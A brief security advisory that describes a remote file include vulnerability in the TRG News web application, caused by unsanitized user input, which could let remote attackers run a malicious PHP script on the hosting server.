A remote file include vulnerability affects TRG News. This issue is due to a failure of the application to properly sanitize user-supplied input prior to using it to carry out critical functionality.

Remote attackers could potentially exploit this issue to include a remote, malicious PHP script. Execution of remote scripts would take place in the context of the Web server hosting the vulnerable application. This will facilitate unauthorized access.
